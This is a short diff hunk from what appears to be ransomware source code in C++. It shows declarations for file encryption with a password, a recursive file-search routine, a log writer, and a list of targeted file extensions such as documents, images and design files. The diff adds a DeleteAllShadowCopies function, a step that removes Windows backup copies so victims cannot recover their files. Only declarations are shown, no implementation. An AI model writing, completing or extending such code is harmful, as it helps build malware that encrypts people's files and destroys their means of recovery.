@@ -23,6 +23,7 @@ void Encrypt(std::string _filePath, std::string _password);
 bool StartEncryption();
 void SearchFile(LPWSTR path);
 DWORD WINAPI SearchEngine(LPVOID lpParameter);
+void DeleteAllShadowCopies();
 void writeLogFile(std::string _filename, std::string password);
 std::vector<std::string>_v_file_extension = { ".txt",".jpg",".gif",".png",".psd",".eps",".ai",
 												".dwg", ".doc",".docx",".xls",".xlsx",".ppt","pptx",
